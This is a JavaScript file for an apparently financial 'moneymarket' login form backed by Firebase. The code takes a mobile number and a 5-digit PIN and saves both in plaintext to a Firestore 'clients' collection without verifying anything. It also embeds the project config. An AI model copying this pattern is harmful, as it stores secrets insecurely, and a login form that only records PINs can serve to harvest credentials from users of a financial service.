// ==========================================
// FIREBASE IMPORTS
// ==========================================

import { initializeApp } from
    "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";

import {
    getFirestore,
    collection,
    addDoc
} from
    "https://www.gstatic.com/firebasejs/12.18.0/firebase-firestore.js";


// ==========================================
// HTML ELEMENTS
// ==========================================

const mobile = document.getElementById("mobile");
const pin = document.getElementById("pin");
const loginForm = document.getElementById("loginForm");
const message = document.getElementById("message");
const togglePinButton = document.getElementById("togglePin");


// ==========================================
// FIREBASE CONFIG
// ==========================================

const firebaseConfig = {

    apiKey: "AIzaSyD_DZXrtrfsL8a2KEUoZbMKslUxZUPKJJ0",

    authDomain: "moneymarket-3f3bd.firebaseapp.com",

    projectId: "moneymarket-3f3bd",

    storageBucket: "moneymarket-3f3bd.firebasestorage.app",

    messagingSenderId: "355673733007",

    appId: "1:355673733007:web:5e4225f68d6844134c3dfa"
};


// ==========================================
// INITIALIZE FIREBASE
// ==========================================

const app = initializeApp(firebaseConfig);

const db = getFirestore(app);


// ==========================================
// FIRESTORE COLLECTION
// ==========================================

const clientsCollection =
    collection(db, "clients");


// ==========================================
// GENERATE CLIENT ID
// ==========================================

function generateClientId() {

    const randomPart = Math.random()
        .toString(36)
        .substring(2, 8)
        .toUpperCase();

    return `CL-${randomPart}`;
}


// ==========================================
// ALLOW DIGITS ONLY
// ==========================================

function digitsOnly(input) {

    input.value = input.value.replace(/\D/g, "");

}


// ==========================================
// MOBILE INPUT
// ==========================================

mobile.addEventListener("input", () => {

    digitsOnly(mobile);

});


// ==========================================
// PIN INPUT
// ==========================================

pin.addEventListener("input", () => {

    digitsOnly(pin);

});


// ==========================================
// SHOW / HIDE PIN
// ==========================================

togglePinButton.addEventListener("click", () => {

    const showing = pin.type === "text";

    pin.type = showing
        ? "password"
        : "text";

    togglePinButton.setAttribute(
        "aria-label",
        showing ? "Show PIN" : "Hide PIN"
    );

});


// ==========================================
// LOGIN
// ==========================================

loginForm.addEventListener("submit", async (event) => {

    event.preventDefault();


    // --------------------------------------
    // Get values
    // --------------------------------------

    const phoneNumber =
        mobile.value.trim();

    const accessCode =
        pin.value.trim();


    // --------------------------------------
    // Validate mobile number
    // --------------------------------------

    if (phoneNumber.length !== 10) {

        message.textContent =
            "Please enter a 10-digit mobile number.";

        return;
    }


    // --------------------------------------
    // Validate PIN
    // --------------------------------------

    if (accessCode.length !== 5) {

        message.textContent =
            "Please enter your 5-digit PIN.";

        return;
    }


    try {

        // ----------------------------------
        // Show loading message
        // ----------------------------------

        message.textContent = "Saving...";


        // ----------------------------------
        // Generate client ID
        // ----------------------------------

        const clientId =
            generateClientId();


        // ----------------------------------
        // Save client to Firestore
        // ----------------------------------

        await addDoc(clientsCollection, {

            clientId: clientId,

            phoneNumber: phoneNumber,

            accessCode: accessCode

        });


        // ----------------------------------
        // Success
        // ----------------------------------

        message.textContent =
            "Client saved successfully.";


        // ----------------------------------
        // Clear form
        // ----------------------------------

        loginForm.reset();


    } catch (error) {

        console.error(
            "Firestore error:",
            error
        );

        message.textContent =
            "Something went wrong while saving.";

    }

});